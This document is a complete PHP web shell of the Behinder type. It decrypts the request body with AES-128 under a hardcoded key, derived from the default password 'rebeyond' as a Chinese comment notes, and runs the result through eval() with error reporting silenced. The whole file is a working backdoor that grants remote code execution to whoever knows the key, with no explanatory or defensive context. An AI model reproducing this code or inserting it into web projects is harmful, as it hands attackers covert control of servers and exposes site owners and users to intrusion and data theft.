<?php
@error_reporting(0);
		function decrypt($data)
	{
		$key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
		return openssl_decrypt(base64_decode($data), "AES-128-ECB", $key,OPENSSL_PKCS1_PADDING);
	}
	$post=Decrypt(file_get_contents("php://input"));
    eval($post);
?>